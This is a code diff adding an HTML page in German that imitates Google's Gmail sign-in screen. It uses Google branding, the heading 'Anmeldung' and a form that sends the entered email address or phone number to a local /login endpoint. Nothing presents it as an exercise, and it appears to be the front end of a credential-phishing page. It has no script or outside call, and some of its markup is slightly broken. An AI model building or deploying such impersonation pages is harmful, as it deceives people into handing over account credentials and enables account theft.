@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <link rel="IMG_0776.png" type="png" href=IMG_0776.png" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #e3e5e6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 30px;
+            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.1);
+            width: 1000px;
+            /* Breitere Box für Text und Eingabefeld */
+            padding: 60px;
+            min-height: 430px;
+            text-align: left;
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            /* Required for absolute positioning of the logo */
+        }
+
+        /* Logo styles */
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        .logo img {
+            width: 60px;
+            /* Smaller logo */
+            height: auto;
+        }
+
+        .text-section {
+            width: 45%;
+            /* Platz für den Text links */
+            padding-right: 20px;
+            margin-top: 80px;
+            /* Adjusted margin to move text down */
+        }
+
+        .form-section {
+            width: 55%;
+            /* Platz für das Eingabefeld rechts */
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            /* Flex-start beibehalten */
+        }
+
+        h1 {
+            font-size: 44px;
+            font-weight: 100;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 15x;
+            font-weight: 100;
+            margin-bottom: 20px;
+            color: #000000;
+
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            margin-top: auto;
+            /* Abstand nach oben */
+        }
+
+        input {
+            padding: 14px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            /* Abstand verringert */
+            margin-left: 80px;
+            width: 90%;
+        }
+
+        .forgot-email {
+            text-align: left;
+            /* Link linksbündig */
+            margin-left: 81px;
+            /* Link linksbündig */
+            margin-bottom: 20px;
+            /* Abstand verringert */
+        }
+
+        .guest-mode-info {
+            margin-left: 80px;
+            /* Link linksbündig */
+            margin-bottom: 30px;
+            /* Abstand zum Button */
+            font-size: 14px;
+            /* Kleinere Schriftgröße */
+            color: #5f6368;
+        }
+
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+            /* Buttons nach rechts verschieben */
+            align-items: center;
+            margin-top: auto;
+            /* Abstand zum oberen Element */
+        }
+
+        .create-account {
+            margin-right: 10px;
+            font-size: 14px;
+        }
+
+        button {
+            background-color: #0b57d0;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            /* Kleineren Button erstellen */
+            font-size: 14px;
+            border-radius: 20px;
+            /* Abgerundete Seiten */
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #1669c1;
+        }
+
+        footer {
+            display: flex;
+            justify-content: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        footer a {
+            margin: 0 10px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        .unterLinks {
+            position: absolute;
+            bottom: 230px;
+            right: 490px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .unterLinks a {
+            margin-left: 15px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .unterLinks a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+
+
+    <div class="container">
+        <!-- Google Logo -->
+        <div class="logo">
+            <img src="IMG_0776.png" alt="Google Logo">
+        </div>
+
+        <div class="text-section">
+            <h1>Anmeldung</h1>
+            <p>Weiter zu Gmail</p>
+        </div>
+
+        <div class="form-section">
+
+
+            <form action="/login" method="post">
+                <input type="text" id="email" name="email" placeholder="E-Mail-Adresse oder Telefonnummer" required>
+                <div class="forgot-email">
+                    <a href="#">E-Mail-Adresse vergessen?</a>
+                </div>
+                <div class="guest-mode-info">
+                    Nicht Ihr Computer? Dann können Sie den Gastmodus verwenden, um sich privat anzumelden.
+                    <p>
+                        <a href="#">Weitere Informationen zur Verwendung des Gastmodus</a>
+                    </p>
+                </div>
+            </form>
+            <div class="button-container">
+                <div class="create-account">
+                    <a href="#">Konto erstellen</a>
+                </div>
+                <button type="submit">Weiter</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="unterLinks">
+        <a href="#">Hilfe</a>
+        <a href="#">Datenschutz</a>
+        <a href="#">Nutzungsbedingungen</a>
+    </div>
+
+
+
+
+</body>
+
+</html>
